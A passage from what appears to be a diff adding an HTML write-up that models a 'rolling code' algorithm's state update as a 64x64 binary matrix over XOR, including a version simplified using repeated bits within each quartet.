+(s_3 \hat{} s_6), (s_3 \hat{} s_5), (s_4 \hat{} s_6), (s_3 \hat{} s_6),
+$$</p>
+<p>$$
+(s_2 \hat{} s_{61}), (s_1 \hat{} s_{61} \hat{} s_{63}), (s_0 \hat{} s_2 \hat{} s_{62}), (s_2 \hat{} s_{61})]
+$$</p>
+<p>Remember that this new <code>state</code> is for the next iteration of the rolling code algorithm. We could continue like this until the last iteration, but it will be really big. Instead, we can create a 64x64 matrix that, given a <code>state</code>, produces the next one (it is really big as well, but it is better to work with):</p>
+<p>$$
+\begin{pmatrix}
+0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 \newline
+0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \newline
+\color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \newline
+0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} \newline
+0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0
+\end{pmatrix}
+$$</p>
+<p>If we call this matrix $A$, we have this relation:</p>
+<p>$$
+\begin{pmatrix}
+n_{63} \newline
+n_{62} \newline
+\vdots \newline
+n_1 \newline
+n_0
+\end{pmatrix} = A \cdot \begin{pmatrix}
+s_{63} \newline
+s_{62} \newline
+\vdots \newline
+s_1 \newline
+s_0
+\end{pmatrix}
+$$</p>
+<p>Where $n$ is the next <code>state</code> and $s$ is the current <code>state</code> within one iteration.</p>
+<p>We can tweak this matrix knowing that the first and last bits of every quartet are the same, so $s_{63} = s_{60}$, $s_{59} = s_{56}$ and so on until $s_3 = s_0$:</p>
+<p>$$
+\begin{pmatrix}
+0 0 \color{red}{1} 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 \color{red}{1} 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
